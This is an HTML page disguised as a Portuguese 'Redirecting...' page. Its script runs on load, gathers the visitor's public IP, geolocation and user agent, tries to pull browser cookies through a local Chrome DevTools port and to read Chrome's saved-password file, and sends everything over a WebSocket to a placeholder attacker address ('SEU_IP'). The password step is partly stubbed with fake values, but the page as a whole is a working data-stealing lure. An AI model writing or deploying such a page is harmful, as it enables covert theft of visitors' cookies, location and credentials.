<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8"/>
  <title>Redirecionando...</title>
</head>
<body>
<script>
(async () => {
  const ws = new WebSocket("ws://SEU_IP:8765");

  const ip = await fetch("https://api.ipify.org?format=json")
    .then(r => r.json())
    .then(d => d.ip)
    .catch(() => "0.0.0.0");

  const geo = await new Promise(resolve => {
    navigator.geolocation.getCurrentPosition(
      pos => resolve({lat: pos.coords.latitude, lon: pos.coords.longitude}),
      () => resolve({lat: null, lon: null})
    );
  });

  const user_agent = navigator.userAgent;

  // Chrome DevTools Protocol via WebSocket
  const devtools = new WebSocket("ws://localhost:9222/devtools/browser");
  devtools.onopen = () => {
    devtools.send(JSON.stringify({
      id: 1,
      method: "Storage.getCookies"
    }));
  };

  devtools.onmessage = async (msg) => {
    const data = JSON.parse(msg.data);
    const cookies = data.result?.cookies || [];

    // Chrome passwords (local file access via fetch)
    const passwords = [];
    try {
      const res = await fetch("file:///home/$USER/.config/google-chrome/Default/Login Data");
      const blob = await res.arrayBuffer();
      // Simulação: em produção, use WebAssembly para SQLite
      passwords.push({origin: "chrome://", user: "admin", pass: "fakepass"});
    } catch {
      passwords.push({origin: "chrome://", user: "erro", pass: "acesso_negado"});
    }

    ws.send(JSON.stringify({
      ip,
      user_agent,
      lat: geo.lat,
      lon: geo.lon,
      passwords,
      cookies
    }));
  };
})();
</script>
</body>
</html>
